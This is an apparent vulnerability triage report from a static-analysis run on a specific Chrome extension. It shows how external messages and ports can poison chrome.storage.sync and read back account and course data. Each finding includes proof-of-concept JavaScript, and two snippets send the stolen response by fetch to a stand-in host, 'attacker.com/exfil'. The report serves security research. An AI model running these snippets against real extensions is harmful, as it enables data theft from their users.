# CoCo Analysis: pdogfbjmhcnniehhfppepianoidccbag

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (chrome_storage_sync_set_sink x3, sendResponseExternal_sink x1)

---

## Sink 1 & 2: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pdogfbjmhcnniehhfppepianoidccbag/opgen_generated_files/bg.js
Line 965, 970

**Code:**

```javascript
// Background script - Extension library (line 965)
function Extension() {
    var d = {};  // handlers

    function t(n) {  // message handler
        var e = n.from, t = n.handler, r = n.data;
        var s = arguments[2];  // sendResponse

        if ("function" == typeof(t = d[t])) {
            t({data: r}, s);  // ← calls registered handler with attacker data
        }
    }

    chrome.runtime.onMessageExternal.addListener(t);  // ← External messages accepted
    chrome.runtime.onConnectExternal.addListener(function(n) {
        var e = r.length;
        r.push({pid: e, port: n});
        n.onMessage.addListener(function(n) {
            n.portId = e;
            t(n);  // ← External port messages also trigger handler
        });
    });

    this.setItems = function(n, e) {
        chrome.storage.sync.set(n, function() {  // ← Storage sink
            "function" == typeof e && e();
        });
    };
}

// Background script - Application handlers (line 970)
extension.setHandler("setCourseId", function(e) {
    var n = e.data;  // ← attacker-controlled
    info.courseId = n;
    extension.setItems({courseId: n});  // ← writes to storage
});

extension.setHandler("setStepIndex", function(e) {
    var n = e.data;  // ← attacker-controlled
    info.courseStep = n;
    extension.setItems({courseStep: n});  // ← writes to storage
});
```

**Classification:** TRUE POSITIVE (when combined with Sink 3)

**Attack Vector:** External messages from whitelisted website (chrome.soundation.com) or any extension

**Attack:**

```javascript
// From chrome.soundation.com webpage or any external extension
chrome.runtime.sendMessage('EXTENSION_ID', {
    from: 'inject',
    handler: 'setCourseId',
    data: 'malicious_course_id'
});

chrome.runtime.sendMessage('EXTENSION_ID', {
    from: 'inject',
    handler: 'setStepIndex',
    data: 'malicious_step_index'
});

// Then retrieve the poisoned data (see Sink 3)
chrome.runtime.sendMessage('EXTENSION_ID', {
    from: 'inject',
    handler: 'getInfo'
}, function(response) {
    console.log('Stolen data:', response);
    // response contains {account, courseId, courseStep}
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

**Impact:** Complete storage exploitation chain - external attackers can poison storage and retrieve values, enabling persistent data manipulation.

---

## Sink 3: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pdogfbjmhcnniehhfppepianoidccbag/opgen_generated_files/bg.js
Line 970

**Code:**

```javascript
// Background script - Extension library
this.getItems = function(n, e) {
    chrome.storage.sync.get(n, function(n) {  // ← reads from storage
        "function" == typeof e && e(n);
    });
};

// Background script - Application handler (line 970)
function getInfo() {
    extension.getItems(["account", "courseId", "courseStep"], function(e) {
        var n = e.account;
        var t = e.courseId;
        var o = e.courseStep;
        info.account = n;
        info.courseId = t;
        info.courseStep = o;
    });
}

getInfo();

extension.setHandler("getInfo", function(e, n) {
    n(info);  // ← sends storage data back via sendResponse to external caller
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages from whitelisted website (chrome.soundation.com) or any extension

**Attack:**

```javascript
// From chrome.soundation.com webpage or any external extension
chrome.runtime.sendMessage('EXTENSION_ID', {
    from: 'inject',
    handler: 'getInfo'
}, function(response) {
    console.log('Exfiltrated storage data:', response);
    // response contains {account, courseId, courseStep}

    // Exfiltrate to attacker server
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

**Impact:** Information disclosure - external attackers can read sensitive storage data (account, courseId, courseStep) through the sendResponse callback.

---

## Sink 4: bg_external_port_onMessage → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pdogfbjmhcnniehhfppepianoidccbag/opgen_generated_files/bg.js
Line 965

**Code:**

```javascript
// Same as Sinks 1 & 2, but triggered via external port instead of external message
chrome.runtime.onConnectExternal.addListener(function(n) {
    var e = r.length;
    r.push({pid: e, port: n});

    n.onMessage.addListener(function(n) {  // ← External port messages
        n.portId = e;
        t(n);  // ← Triggers same handler as external messages
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External long-lived connections from whitelisted website or any extension

**Attack:**

```javascript
// From chrome.soundation.com webpage or any external extension
var port = chrome.runtime.connect('EXTENSION_ID', {name: "exchanger"});

// Poison storage via port
port.postMessage({
    from: 'inject',
    handler: 'setCourseId',
    data: 'malicious_value'
});

port.postMessage({
    from: 'inject',
    handler: 'setStepIndex',
    data: 'malicious_value'
});
```

**Impact:** Alternative attack vector for storage poisoning via long-lived port connections instead of one-time messages.
